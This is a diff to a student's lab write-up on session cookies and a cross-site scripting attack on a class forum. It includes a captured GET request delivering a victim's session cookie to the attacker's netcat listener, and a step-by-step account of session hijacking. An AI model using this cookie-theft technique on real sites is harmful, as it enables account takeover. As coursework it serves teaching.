@@ -3,7 +3,7 @@
 
 ### a. What new cookie did you see when you logged in as Alice?
 
-Upon logging in as alice, I see a cookie named "session" whose value is some base64 encoded text
+Upon logging in as Alice, I see a cookie named "session" whose value is some encoded text
  
 ### b. What is a session cookie?
 
@@ -15,21 +15,21 @@ If you copy Alice's cookies to the new browser window and reload, you get logged
  
 ### d. How session cookies work
 
-1. User signs in at the login page. A HTTP POST request is sent to the server, which contains username and password information.
+1. User signs in at the login page. The browser sends a HTTP POST request to the server, which contains username and password information.
 
-2. The server responds with 302 FOUND HTTP response with a header called "Set-Cookie" that contains the name value pair of session cookie and the path of the cookie. The session cookie will be set by the server regardless of user's login status. However, the session cookie has session ID, which is used to verify user's identity. If the session ID is not associated with any valid users at the server side at the given moment, the serve won't allow users with the wrong session ID to access restricted domains.  
+2. The server responds with 302 FOUND HTTP response with a header called "Set-Cookie" that contains the name value pair of session cookie and the path of the cookie. The session cookie will be set by the server regardless of user's login status. However, the session cookie contains session ID, which is used to verify user's identity. If the session ID is not associated with any valid user at the server side at the given moment, the serve won't allow user with the wrong session ID to access restricted domains.  
 
 3. If the user selected "Remember me" on the login page, then the server will also respond with another "Set-Cookie" header, containing name value pair of remember token with expiration date, path, and HttpOnly flag.
 
-4. After receiving the name value pair of session cookie (and remember token) from the server through the "Set-Cookie" flag, the browser includes session cookie in "Cookie" header of subsequent HTTP GET requests until the user exits the site or quits the browser. 
+4. After receiving the name value pair of session cookie (and remember token) from the server through the "Set-Cookie" flag, the browser includes session cookie (and remember token cookie if it was set) in "Cookie" header of subsequent HTTP GET requests until the user exits the site or quits the browser. 
 
-5. Suppose the user exited the website (or quit the browser). Suppose the remember token cookie was set in previous session and the remember token cookie is not expired. When the user tries to login to the same website, the browser sends a HTTP GET request with remember token cookie. 
+5. Suppose the user exited the website (or quit the browser). Suppose the remember token cookie was set in previous session and the remember token cookie has not expired. When the user tries to login to the same website, the browser sends a HTTP GET request with remember token cookie. 
 
 6. If the remember token cookie is valid, the server responds with 200 OK with a new session cookie, specified in the "Set-Cookie" header of the HTTP Response. Then, the interaction between the browser and the server proceeds in the manner of step 3.    
 
 7. When use presses the log out button, the browser sends a HTTP GET request to a logout page.  
 
-8. The server responds with 302 FOUND, with appropriate number of "Set-Cookie" headers to delete the cookie values and reset cookie expiration date. 
+8. The server responds with 302 FOUND, with appropriate number of "Set-Cookie" headers to delete the cookie values and reset cookie expiration date for all the set cookies related to the session.  
  
 ### e. What opportunities do session cookies open to you?
 
@@ -69,12 +69,11 @@ The above command listens for any connections to port 80.
 ### c. Show the form in which Alice's information arrived on Kali.
 
 ```
-GET /?s=.eJwtzj0OwjAMQOG7ZGZwnNiOe5kq8Y9gbemEuDsdWJ_0pO9T9jzifJbtfVzxKPvLy1YqNKw0jGExjgkCMGJqt2QeYahWJSrNYQmm3iTvQ1SZVg8IcVNFcRHCma2HdEAjdHC6syHijBa-NHFN9Orc3TtxXZA5G5cbcp1x_DXl-wNqHi7_.Zzj-jA.ugfkPEaZWEtqhZE1uIlWA6gIXRA HTTP/1.1
+GET /?s=<Alice's Session cookie>  HTTP/1.1
 Host: 192.168.187.128
 Origin: http://cs338.jeffondich.com
 Connection: keep-alive
 Accept: */*
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15
 Accept-Language: en-US,en;q=0.9
 Referer: http://cs338.jeffondich.com/
 Accept-Encoding: gzip, deflate 
@@ -82,13 +81,13 @@ Accept-Encoding: gzip, deflate
 
 ### d. What can Eve do now to login to FDF as Alice?
 
-Eve can now login as Alice using Alice's session cookie. Eve can either use proxy like Burpsuite to modify HTTP request or open the inspector tool to change the value of the session cookie to Alice's session cookie.
+Eve can now login as Alice using Alice's session cookie. Eve can either use proxy like Burpsuite to modify HTTP request or open the inspector tool to change the value of the session cookie to that of Alice's session cookie.
 
 ### e. Diagram clearly the sequence of events in Eve's attack on Alice via the FDF
 
 1. Eve first posts a malicious script on the FDF and uses netcat to listen to oncoming traffic at port 80.
 2. Alice opens the malicious post, and the scripts gets executed by the browser. 
-    - As explained above, the script fetches the session cookie and sends are get request to Eve's machine
+    - As explained above, the script fetches the session cookie and sends a get request to Eve's machine
 3. A HTTP GET request is sent to the specified ip address and port number.  
 4. netcat, which is running of Eve's machine, receives the requests, displaying Alice's session cookie as part of the requested url.  
 5. Eve uses Alice's cookie to log into the FDF by changing her session cookie value to be Alice's.
